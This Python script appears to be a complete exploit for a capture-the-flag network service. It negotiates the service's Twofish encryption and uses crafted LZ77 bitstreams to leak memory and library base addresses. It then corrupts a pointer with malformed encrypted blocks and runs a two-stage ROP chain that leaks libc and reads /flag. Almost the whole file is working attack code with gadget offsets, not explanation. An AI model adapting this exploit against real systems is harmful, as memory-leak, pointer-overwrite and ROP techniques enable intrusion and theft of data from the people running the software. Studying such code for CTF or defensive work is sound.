#!/usr/bin/env python3

import sys, os
import socket
import time
import zlib
import base64
import struct
import select
from twofish import Twofish
import binascii
import subprocess
import secrets

def GetAllData(s, timeout=0.5):
	data = b""
	while(1):
		(r,w,e) = select.select([s], [], [], timeout)
		if len(r) == 0:
			break

		indata = s.recv(4096)
		if len(indata) == 0:
			break

		data += indata

	print("data len: %d" % len(data))
	#print(data)
	return data

def GetFixedData(s, datalen):
	data = b""
	while(len(data) != datalen):
		(r,w,e) = select.select([s], [], [], 1.5)
		if len(r) == 0:
			continue

		indata = s.recv(datalen - len(data))
		if len(indata) == 0:
			print("Error reading enough data before socket close")
			sys.exit(0)

		data += indata

	return data

def SendLine(s, data):
	s.send(data.encode("utf-8"))

def DHHandshake(s):
	time.sleep(0.5)
	(c, ch0, ch1, ch2, ch3) = struct.unpack("<bQQQQ", s.recv(33))
	challenge = (ch3 << (128+64)) | (ch2 << 128) | (ch1 << 64) | ch0

	print("DH challenge: %s" % (hex(challenge)))
	private = secrets.randbits(256)

	print("DH private: %s" % (hex(private)))

	P = 0xe18c3648785c484b9b9d60f9ffa0e46cd1c5d585b1b6fc90794147a203f65b2b #293068901101250920604253587436511702847
	G = 0x3d0daebfc6a112e58c1885b6d824420b73c9b689c1029ad37748c58e56febfa7 #95119402746847851499189423366756587041

	challenge2 = pow(G, private, P)
	result = pow(challenge, private, P)
	print("DH challenge response: %s" % (hex(challenge2)))
	print("DH result: %s" % (hex(result)))

	result_0 = result & 0xffffffffffffffff
	result_1 = (result >> 64) & 0xffffffffffffffff
	result_2 = (result >> 128) & 0xffffffffffffffff
	result_3 = (result >> (128+64)) & 0xffffffffffffffff

	ch2_0 = challenge2 & 0xffffffffffffffff
	ch2_1 = (challenge2 >> 64) & 0xffffffffffffffff
	ch2_2 = (challenge2 >> 128) & 0xffffffffffffffff
	ch2_3 = (challenge2 >> (128+64)) & 0xffffffffffffffff

	s.send(struct.pack("<bQQQQ", 0, ch2_0, ch2_1, ch2_2, ch2_3))

	Key = struct.pack("<QQ", result_0, result_1)
	IV = struct.pack("<QQ", result_2, result_3)
	return {"key": Key, "iv": IV}

def EncryptData(data):
	global t, IV

	#pad the data as needed
	PadChar = 16 - (len(data) % 16)
	data += PadChar.to_bytes(1, "little") * PadChar

	#xor with IV and encrypt each block
	outdata = b''
	for i in range(0, len(data), 16):
		dataxored = b''
		for x in range(0, 16):
			dataxored += (data[i+x] ^ IV[x % len(IV)]).to_bytes(1, "little")

		dataencrypt = t.encrypt(dataxored)
		IV = dataencrypt
		outdata += dataencrypt

	#need to add a block count to the beginning
	blockcount = (len(outdata) / 16) - 1
	if(blockcount > 255):
		print("EncryptData given too much data to encrypt")
		sys.exit(0)

	outdata = bytes([int(blockcount)]) + outdata
	return outdata

def DecryptData(data):
	global t, IV

	outdata = b''
	while(len(data)):
		#get the block count
		blockcount = data[0] + 1
		data_to_decrypt = data[1:(blockcount*16) + 1]
		data = data[(blockcount*16) + 1:]

		#decrypt each block then xor as needed
		for i in range(0, len(data_to_decrypt), 16):
			datadecrypt = t.decrypt(data_to_decrypt[i:i+16])

			dataxored = b''
			for x in range(0, 16):
				dataxored += (datadecrypt[x] ^ IV[x % len(IV)]).to_bytes(1, "little")

			IV = data_to_decrypt[i:i+16]
			outdata += dataxored

		padchar = outdata[-1]
		if(padchar > 16):
			print("Invalid pad char on decryption")
			sys.exit(0)

		outdata = outdata[0:len(outdata) - padchar]

	return outdata

def CompressLZ77(data):
	#fake a LZ77 buffer, just claim each byte is unique
	crc = zlib.crc32(data, 0x04C11DB7 ^ ~0)

	outbindata = ""
	for entry in data:
		outbindata += "0" + ("0"*8 + bin(entry)[2:])[-8:]

	outbindata += "1"*(1+13+4)
	if(len(outbindata) % 8):
		outbindata += "0"*(8-(len(outbindata) % 8))

	outdata = b""
	for i in range(0, len(outbindata), 8):
		outdata += bytes([int(outbindata[i:i+8], 2)])

	outdata = bytes([len(outdata) + 1, len(data) - 1]) + outdata + struct.pack("<I", crc)
	return outdata

def DecompressLZ77(data):
	final_out = b""
	FinalPos = 0

	while(len(data)):
		outdata = b""
		DecodeLength = 0
		CompressLength = 0
		CurPos = 0
		ShiftPos = 0
		while(1):
			CompressLength = CompressLength + (((data[CurPos] & 0x7f) + 1) << ShiftPos)
			if((data[CurPos] & 0x80) == 0):
				break
			CurPos += 1
			ShiftPos += 7

		#adjust for last byte
		CurPos += 1

		#print("Compress length (%x): %d - %s" % (FinalPos, CompressLength, CompressLenChars))
		if(CompressLength > len(data)):
			print("Error: don't have all compress data %d > %d" % (CompressLength, len(data)))
			break

		ShiftPos = 0
		while(1):
			DecodeLength = DecodeLength + (((data[CurPos] & 0x7f) + 1) << ShiftPos)
			if((data[CurPos] & 0x80) == 0):
				break
			CurPos += 1
			ShiftPos += 7

		#trim off our size
		CurPos += 1
		data = data[CurPos:]

		#print("Decompress length: %d" % (DecodeLength))

		#reset our bitstream
		Bitstream = ""

		CurPos = 0
		FoundEnd = 0
		while(len(outdata) < DecodeLength):
			if len(Bitstream) < 1:
				Bitstream = Bitstream + ("0"*8 + bin(data[CurPos])[2:])[-8:]
				CurPos += 1

			CurBit = Bitstream[0]
			Bitstream = Bitstream[1:]
			if CurBit == '0':
				if len(Bitstream) < 8:
					Bitstream = Bitstream + ("0"*8 + bin(data[CurPos])[2:])[-8:]
					CurPos += 1

				#print("0 " + Bitstream[0:8])
				
				outdata += bytes([int(Bitstream[0:8], 2)])
				Bitstream = Bitstream[8:]

				#print("byte data len: %d" % (len(outdata)))
			else:
				while(len(Bitstream) < 17):
					Bitstream = Bitstream + ("0"*8 + bin(data[CurPos])[2:])[-8:]
					CurPos += 1

				#print("1 " + Bitstream[0:13] + " " + Bitstream[13:17])

				ReadPos = int(Bitstream[0:13], 2)
				MatchLen = int(Bitstream[13:17], 2)
				Bitstream = Bitstream[17:]

				if((ReadPos == ((1<<13)-1)) and (MatchLen == ((1<<4)-1))):
					FoundEnd = 1
					break

				ReadPos += 1
				MatchLen += 2
				#print("pos: %d, len: %d, data: %d" % (ReadPos, MatchLen, len(outdata)))

				while(MatchLen):
					outdata += bytes([outdata[-ReadPos]])
					MatchLen -= 1

				#print("new data len: %d" % (len(outdata)))
		#done decompressing, sizes should match
		if(len(outdata) != DecodeLength):
			print("Error decompressing, sizes dont match")
			sys.exit(0)

		if(not FoundEnd):
			while(len(Bitstream) < 18):
				Bitstream = Bitstream + ("0"*8 + bin(data[CurPos])[2:])[-8:]
				CurPos += 1

			if(Bitstream[0] == "1"):
				Bitstream = Bitstream[1:]
				ReadPos = int(Bitstream[0:13], 2)
				MatchLen = int(Bitstream[13:17], 2)
				Bitstream = Bitstream[17:]

			if((ReadPos != ((1<<13)-1)) or (MatchLen != ((1<<4)-1))):
				print("Error locating end compression flag")
				sys.exit(0)

		#trim off the processed data, skip crc
		data = data[CurPos+4:]
		FinalPos += CurPos

		#append to our final buffer skipping the crc at the end
		#print(outdata)
		final_out += outdata

	return final_out

def DumpMemory(s):
	Memory = b''

	f = open("a.dmp", "wb")

	HashTable = {}
	for x in range(0, 0x10000):
		crc = zlib.crc32(struct.pack("<H", x), 0x04C11DB7 ^ ~0)
		HashTable[crc] = x

	step = 0x100
	#need to create a fake lz77 bitstream to leak memory with
	for x in range(0x2000, 0, -step):
		outdata = b''
		print("Reading: -%08x - %08x" % (x, x-step))
		for i in range(x, x-step, -2):
			Bitstream = "1" + ("0"*13 + bin(i - 1)[2:])[-13:] + "0000"
			Bitstream += "1"*(1+13+4)
			if(len(Bitstream) % 8):
				Bitstream += "0"*(8-(len(Bitstream) % 8))

			#convert to bytes
			Bytestream = b''
			for i in range(0, len(Bitstream), 8):
				Bytestream += bytes([int(Bitstream[i:i+8], 2)])

			outdata += bytes([len(Bytestream) + 1, 3]) + Bytestream + b"\xff"*4

		#need to add in compress/decompress byte data
		s.send(EncryptData(outdata))
		outdata = DecryptData(GetAllData(s)).decode("utf-8")

		outdata = outdata.split("\n")
		for entry in outdata:
			if len(entry) == 0:
				continue
			if not entry.startswith("Hash Validation"):
				print("Error getting memory at %x\n" % (x))
				input()
				sys.exit(0)

			hashval = struct.unpack(">I", struct.pack("<I", int(entry.split()[5], 16)))[0]
			f.write(struct.pack("<H", HashTable[hashval]))

	f.close()

def DumpMemory2(s):
	Memory = b''
	step = 0x20
	x = 2
	outdata = b''
	i = 2
	Bitstream = "1" + ("0"*13 + bin(i - 1)[2:])[-13:] + "0000"
	Bitstream += "1"*(1+13+4)
	if(len(Bitstream) % 8):
		Bitstream += "0"*(8-(len(Bitstream) % 8))

	#convert to bytes
	Bytestream = b''
	for i in range(0, len(Bitstream), 8):
		Bytestream += bytes([int(Bitstream[i:i+8], 2)])

	outdata += bytes([len(Bytestream) + 1, 3]) + Bytestream + b"\xff"*4

	#need to add in compress/decompress byte data
	s.send(EncryptData(outdata))
	outdata = DecryptData(GetAllData(s)).decode("utf-8")

	outdata = outdata.split("\n")
	for entry in outdata:
		if len(entry) == 0:
			continue
		if not entry.startswith("Hash Validation"):
			print("Error getting memory at %x\n" % (x))
			input()
			sys.exit(0)

	data = subprocess.check_output("cat /proc/`pgrep cozen`/maps > memory-map && python parse-a.py", shell=True).decode("utf-8")
	print(data)
	entries = []
	for line in data.split("\n"):
		if len(line) == 0:
			continue
		curline = line.split()
		if curline[3] not in entries:
			entries.append(curline[3])
	for entry in entries:
		print(entry)

def GetMemoryDump(s, RunName):
	#send an entry for lz77 to force writing the data back to us from the memory file
	Bitstream = "1"*(1+13+3) + "0"
	if(len(Bitstream) % 8):
		Bitstream += "0"*(8-(len(Bitstream) % 8))

	#convert to bytes
	Bytestream = b''
	for i in range(0, len(Bitstream), 8):
		Bytestream += bytes([int(Bitstream[i:i+8], 2)])

	readdata = bytes([len(Bytestream) + 1, 3]) + Bytestream + b'\xff'*4
	s.send(EncryptData(readdata))

	FileSize = struct.unpack("<Q", GetFixedData(s, 8))[0]
	print("file size: %d" % ( FileSize))

	f = open("mem-diff/" + RunName, "wb")
	f.write(GetFixedData(s, FileSize))
	f.close()

	FileSize = struct.unpack("<Q", GetFixedData(s, 8))[0]
	print("file map size: %d" % ( FileSize))

	f = open("mem-diff/" + RunName + ".memory-map", "wb")
	f.write(GetFixedData(s, FileSize))
	f.close()


def GetBases(s):
	Memory = b''

	HashTable = {}
	for x in range(0, 0x10000):
		crc = zlib.crc32(struct.pack("<H", x), 0x04C11DB7 ^ ~0)
		HashTable[crc] = x

	#need to create a fake lz77 bitstream to leak memory with
	#format: memory offset, value to adjust to get base
	Offsets = {"icuuc": [0x110, 0xb1e40], "heap": [0x138, 0x6780], "menu": [0x1d0, 0x5049]}
	OffsetKeys = list(Offsets.keys())
	outdata = ''
	for CurOffset in OffsetKeys:
		readdata = b''
		x = Offsets[CurOffset][0]
		print("Reading %s: %08x - %08x" % (CurOffset, x, x+8))
		for i in range(x+8, x, -2):
			Bitstream = "1" + ("0"*13 + bin(i - 1)[2:])[-13:] + "0000"
			Bitstream += "1"*(1+13+4)
			if(len(Bitstream) % 8):
				Bitstream += "0"*(8-(len(Bitstream) % 8))

			#convert to bytes
			Bytestream = b''
			for i in range(0, len(Bitstream), 8):
				Bytestream += bytes([int(Bitstream[i:i+8], 2)])

			readdata += bytes([len(Bytestream) + 1, 3]) + Bytestream + b'\xff'*4

		#need to add in compress/decompress byte data
		s.send(EncryptData(readdata))
		outdata += DecryptData(GetFixedData(s, 260)).decode("utf-8")

	outvalues = {}
	outdata = outdata.split("\n")
	KeyIndex = 0
	for count in range(0, len(outdata)):
		entry = outdata[count]
		if len(entry) == 0:
			continue
		if not entry.startswith("Hash Validation"):
			print("Error getting memory at %x\n" % (x))
			input()
			sys.exit(0)

		memval = int(entry.split()[5], 16)
		memval = struct.unpack(">I", struct.pack("<I", memval))[0]
		memval = HashTable[memval]
		if (count % 4) == 0:
			outvalues[OffsetKeys[int(count / 4)]] = 0

		outvalues[OffsetKeys[int(count / 4)]] = outvalues[OffsetKeys[int(count / 4)]] | (memval << (16 * (count % 4)))
		if(count % 4 == 3):
			outvalues[OffsetKeys[int(count / 4)]] -= Offsets[OffsetKeys[int(count / 4)]][1]

	return outvalues

def OverwriteMemory(s, OverwriteValue, shellcodelen):
	#need to send a bad block of encrypted data causing the pointer to move backwards

	global t, IV

	EncryptObjThisPtr = 0x0270
	InRingStart = 0x0330
	InDataEndPtrStart = InRingStart + 0x8a
	InDataEndPtr = InDataEndPtrStart + shellcodelen

	#print("Start _InDataEnd: %016lx" % (InDataEndPtr))

	EncryptObjOffset = InDataEndPtr - EncryptObjThisPtr

	if(EncryptObjOffset < 0):
		print("Error: Pointers are invalid")
		sys.exit(0)

	print("Moving _InDataEnd on top of Encryption class")

	Steps = []
	DoingSteps = 0
	while EncryptObjOffset:
		#pad the data as needed
		data = b"\x00"
		PadLen = 15
		if EncryptObjOffset < 1000:
			#under 1000 bytes, determine the step size needed to always have > 128 bytes per step
			if not DoingSteps:
				if(EncryptObjOffset < (255-16)):
					if(EncryptObjOffset < 128):
						print("Error: Can't calculate steps")
						input()
						sys.exit(0)

					Steps = [EncryptObjOffset]
				else:
					StepCount = int(EncryptObjOffset / 130)
					Steps = [130] * StepCount

					TotalSteps = 130*StepCount

					#distribute what is left across the steps until we have enough
					CurStep = 0
					while TotalSteps != EncryptObjOffset:
						if(Steps[CurStep] != 239):
							TotalSteps += 1
							Steps[CurStep] += 1
						CurStep += 1
						CurStep = CurStep % len(Steps)

				DoingSteps = 1

			PadChar = Steps.pop(0)
		else:
			PadChar = 255-16
			if(PadChar > EncryptObjOffset):
				PadChar = EncryptObjOffset

		EncryptObjOffset -= PadChar

		#print("_InDataEnd %016lx - %d = %016lx" % (InDataEndPtr, PadChar, InDataEndPtr - PadChar))
		InDataEndPtr -= PadChar

		#account for the block itself
		PadChar += 16
		data += PadChar.to_bytes(1, "little") * PadLen

		#xor with IV and encrypt each block
		outdata = b''
		for i in range(0, len(data), 16):
			dataxored = b''
			for x in range(0, 16):
				dataxored += (data[i+x] ^ IV[x % len(IV)]).to_bytes(1, "little")

			dataencrypt = t.encrypt(dataxored)
			IV = dataencrypt
			outdata += dataencrypt

		#need to add a block count to the beginning
		blockcount = (len(outdata) / 16) - 1	
		outdata = bytes([int(blockcount)]) + outdata
		#if EncryptObjOffset == 0:
		#	print("Waiting")
		#	input()

		s.send(outdata)
		#if EncryptObjOffset == 0:
		#	input()

	#overwrite value
	outdata = struct.pack("<Q", OverwriteValue) + b"\x00" * 7 + b"\x01"

	print("sending overwrite block")
	#input()

	#need to add a block count to the beginning
	blockcount = (len(outdata) / 16) - 1	
	outdata = bytes([int(blockcount)]) + outdata
	s.send(outdata)

def GetShellcode(Bases, Stage2Size):
	shellcode = b''

	EmptyFunc = 0
	Return0Func = Bases["icuuc"] + 0x6a26e		#xor eax, eax ; ret
	Return1Func = Bases["icuuc"] + 0x6b614		#mov eax, 1 ; ret
	ShellcodeAddr = Bases["heap"] + 0x21040		#location of decompression buffer
	RSPPivot1Addr = Bases["icuuc"] + 0xbb34e	#push rsi ; mov ch, 0xfa ; jmp qword ptr [rsi + 0x66]
	RSPPivot2Addr = Bases["icuuc"] + 0x6af6e	#pop rsp ; pop r13 ; pop r14 ; ret
	PutsCallAddr = Bases["menu"] + 0x24e4
	PutsAddr = Bases["menu"] + 0x6f40
	PopRDIRet = Bases["icuuc"] + 0x69e54		#pop rdi ; ret
	PopRSIRet = Bases["icuuc"] + 0x6af72		#pop rsi ; ret
	PopRDXRCXRet = Bases["icuuc"] + 0x79684		#pop rdx ; pop rcx ; pop r12 ; ret
	Mov0ToRDIRet = Bases["icuuc"] + 0xf0a9d		#mov qword ptr [rdi + 0xc], 0 ; ret
	PopPopRet = Bases["icuuc"] + 0x6abb7		#pop r12 ; pop r13 ; ret
	RegisterBBSMenu = Bases["menu"] + 0x3540
	MainMenuAddr = Bases["menu"] + 0x71e8
	FReadAddr = Bases["icuuc"] + 0x657d4

	#calculate our overwrite value to point to where vtable will be
	OverwriteValue = ShellcodeAddr + 8

	VTable = [
		RSPPivot1Addr,	#0x00
		PopRDIRet,	#0x08
		PutsAddr+1,	#0x10
		PutsCallAddr,	#0x18
		PopRDIRet,	#0x20
		Return1Func,	#0x28
		PopRDIRet,	#0x30
		MainMenuAddr - 0xc,	#0x38
		Mov0ToRDIRet,	#0x40
		Return0Func,	#0x48
		PopPopRet,		#0x50
	]

	for entry in VTable:
		shellcode += struct.pack("<Q", entry)

	#pad out to 0x66 bytes
	shellcode += b'\x11' * (0x66-len(shellcode)-8)

	#add our pop rsp/ret
	shellcode += struct.pack("<Q", RSPPivot2Addr)

	#8 byte alignment
	shellcode += b'\xaa'*(8 - (len(shellcode) % 8))

	"""
	;fread(buffer, size, num, stream)
	;rdx = size
	;rbp = stdout-0x10
	;r12 = 0
	;r13 = 0x1347e0 rop gadget
	;rax = 0x11cf27 rop gadget
	;r9 = gadget that accounts for 3 calls on stack
	0x00000000000eed75 : pop rdx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
	0x00000000000775d0 : pop r9 ; nop word ptr [rax + rax] ; mov byte ptr [rdx], al ; ret
	0x0000000000077747 : pop rax ; ret
	0x00000000000eed75 : pop rdx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
	0x0000000000074eec : mov rsi, qword ptr [rbp + 0x10] ; add r14, 1 ; add rsi, r12 ; call r13
	0x00000000001347e0 : mov rbp, rsi ; mov rsi, rdx ; call rax
	0x000000000011cf27 : mov rcx, qword ptr [rbp + 8] ; mov qword ptr [rsp + 8], rax ; mov rdi, rax ; call r9
	0x000000000006a4a6 : add rsp, 0x18 ; ret
	0x00000000000e8cf5 : pop rdx ; pop rbp ; pop r12 ; ret
	PopRDI -> FRead
	"""
	PopRAXRet = Bases["icuuc"] + 0x77747
	PopR9Ret = Bases["icuuc"] + 0x775d0
	Pop5Ret = Bases["icuuc"] + 0xeed75
	MovRSICallR13 = Bases["icuuc"] + 0x74eec
	MovRBPCallRAX = Bases["icuuc"] + 0x1347e0
	MovRCXCallR9 = Bases["icuuc"] + 0x11cf27
	AddRSP18Ret = Bases["icuuc"] + 0x6a4a6
	PopRDXRBPR12Ret = Bases["icuuc"] + 0xe8cf5
	StdoutAddr = Bases["menu"] + 0x6fb0
	Table = [
		RegisterBBSMenu,
		PopRDIRet,	#0x08
		PutsAddr+2,	#0x10
		PutsCallAddr,	#0x18
		RegisterBBSMenu,
		PopRDIRet,	#0x08
		PutsAddr+3,	#0x10
		PutsCallAddr,	#0x18
		RegisterBBSMenu,
		PopRDIRet,	#0x08
		PutsAddr+4,	#0x10
		PutsCallAddr,	#0x18
		RegisterBBSMenu,
		PopRDIRet,	#0x08
		PutsAddr+5,	#0x10
		PutsCallAddr,	#0x18
		RegisterBBSMenu,
		PopRDIRet,	#0x08
		PutsAddr+6,	#0x10
		PutsCallAddr,	#0x18
		RegisterBBSMenu,
		Pop5Ret,
		Bases["heap"],
		0,
		0,
		0,
		0,
		PopR9Ret,
		AddRSP18Ret,
		PopRAXRet,
		MovRCXCallR9,
		Pop5Ret,
		Stage2Size,
		StdoutAddr - 0x10,
		0,
		MovRBPCallRAX,
		0,
		MovRSICallR13,
		PopRDXRBPR12Ret,
		1,
		0,
		0,
		PopRDIRet,
	]

	for entry in Table:
		shellcode += struct.pack("<Q", entry)

	#value RDI will pop which needs to be at the end of the shellcode
	Table = [
		ShellcodeAddr + len(shellcode) + 0x18,	#0x10 = size of this structure + 8 bytes for size info
		FReadAddr
	]

	for entry in Table:
		shellcode += struct.pack("<Q", entry)

	sizebytes = b''
	shellcodesize = len(shellcode) + 4	#we pad to 8 bytes in the buffer but take away for 4 the missing CRC
	while(shellcodesize):
		shellcodesize -= 1
		newbyte = shellcodesize & 0x7f
		shellcodesize >>= 7
		if(shellcodesize):
			newbyte |= 0x80
		sizebytes += bytes([newbyte])

	#force decode size too large so we fail to decode
	shellcodesize = (32*1024)+1
	while(shellcodesize):
		shellcodesize -= 1
		newbyte = shellcodesize & 0x7f
		shellcodesize >>= 7
		if(shellcodesize):
			newbyte |= 0x80
		sizebytes += bytes([newbyte])

	#give fake information for our shellcode so it fails to fully decompress
	shellcode = sizebytes + b'\x00'*(8-len(sizebytes)) + shellcode

	return (OverwriteValue, shellcode)

def GetStage2(Bases):
	shellcode = b''

	SyscallRet = Bases["libc"] + 0xd1fb9		#syscall ; ret
	PopRAXRet = Bases["libc"] + 0xbe987		#pop rax ; ret
	PopRDIRet = Bases["libc"] + 0x26d8e		#pop rdi ; ret
	PopRSIRet = Bases["libc"] + 0x321aa		#pop rsi ; ret
	PopRDXRet = Bases["libc"] + 0x544c2		#pop rdx ; ret
	FlagStr = Bases["libc"] + 0x19dd55		#/flag
	WriteLoc = Bases["libc"] + 0x1d2d00
	PushRAXRet = Bases["libc"] + 0x1339a4	#push rax ; pop rbx ; pop rbp ; pop r12 ; ret
	MovRDICall = Bases["libc"] + 0x2839b	#mov rdi, rbx ; call r12

	Table = [
		PopRAXRet,
		2,			#open
		PopRDIRet,
		FlagStr,
		PopRSIRet,
		0,
		SyscallRet,

		#store off rax into rdi
		PushRAXRet,
		0,
		PopRAXRet,
		MovRDICall,

		PopRAXRet,
		0,			#read
		PopRSIRet,
		WriteLoc,
		PopRDXRet,
		256,
		SyscallRet,

		PopRAXRet,
		1,			#write
		PopRDIRet,
		1,			#stdout
		SyscallRet,

		#call read on stdin forcing a failure when we close connection
		PopRAXRet,
		0,			#read
		PopRDIRet,
		0,			#stdin
		SyscallRet
	]
	for entry in Table:
		shellcode += struct.pack("<Q", entry)

	return shellcode

if(len(sys.argv) == 2):
	sys.argv.append("51015")

s = socket.create_connection([sys.argv[1], int(sys.argv[2])])
time.sleep(1)

GetFixedData(s, 21)

print("Sending request for encryption")
SendLine(s, "Y\n")

#capture the list and find the entry for twofish
EncList = GetFixedData(s, 86).decode("utf-8").split("\n")
for line in EncList:
	if "Twofish" in line:
		print("Sending request for twofish")
		SendLine(s, line.split()[1] + "\n")

#handshake for the key and IV
DH = DHHandshake(s)
print("Encryption Key:", binascii.b2a_hex(DH["key"]))
print("Encryption IV:", binascii.b2a_hex(DH["iv"]))

t = Twofish(DH["key"])
IV = DH["iv"]

outdata = DecryptData(GetFixedData(s, 66)).decode("utf-8")

if "Use compression?" not in outdata:
	print("Error detecting compression question")
	sys.exit(0)

print("Sending request for compression")
s.send(EncryptData("y\n".encode("utf-8")))

#find the line for lz77
CompressList = DecryptData(GetFixedData(s, 133)).decode("utf-8").split("\n")
for line in CompressList:
	if "LZ77" in line:
		print("Sending request for lz77")
		s.send(EncryptData((line.split()[1] + "\n").encode("utf-8")))

HashList = DecryptData(GetFixedData(s, 133)).decode("utf-8").split("\n")
for line in HashList:
	if "CRC" in line:
		print("Sending request for crc")
		s.send(EncryptData((line.split()[1] + "\n").encode("utf-8")))

outdata = DecompressLZ77(DecryptData(GetFixedData(s, 434)))

#DumpMemory(s)
#print("done dumping")
#input()

#DumpMemory2(s)
#print("done dumping")
#input()

Bases = GetBases(s)
for entry in Bases:
	print("%s base: %016lx" % (entry, Bases[entry]))

#GetMemoryDump(s, "run1")
#print("got memory dump")
#input()

print("Generating shellcode")
Bases["libc"] = 0
temp_stage2 = GetStage2(Bases)
(OverwriteValue, shellcode) = GetShellcode(Bases, len(temp_stage2))

print("Shellcode len: 0x%x" % (len(shellcode)))
#input()

s.send(EncryptData(shellcode))
DecryptData(GetFixedData(s, 33))

OverwriteMemory(s, OverwriteValue, len(shellcode))
#input()

#we need the data before "\nError: MainMenu not initialized"
#and also need to cut that data off
InData = b""
Data = []

#keep reading until we get 7 entries of our error string
while(len(Data) != 7):
	InData += GetFixedData(s, 1)
	Data = InData.split(b"\nError: MainMenu not initialized\n\n")

Data.reverse()
Bases["libc"] = 0
for entry in Data:
	Bases["libc"] = Bases["libc"] << 8
	if len(entry):
		Bases["libc"] |= entry[0]
Bases["libc"] = (Bases["libc"] << 8) - 0x7a700
print("LibC Base: %016lx" % (Bases["libc"]))

print("Sending second payload")
s.send(GetStage2(Bases))

flag = GetFixedData(s, 256)
flag = flag[0:flag.find(b'\x00')].decode("utf-8")
print("The flag is: ", flag)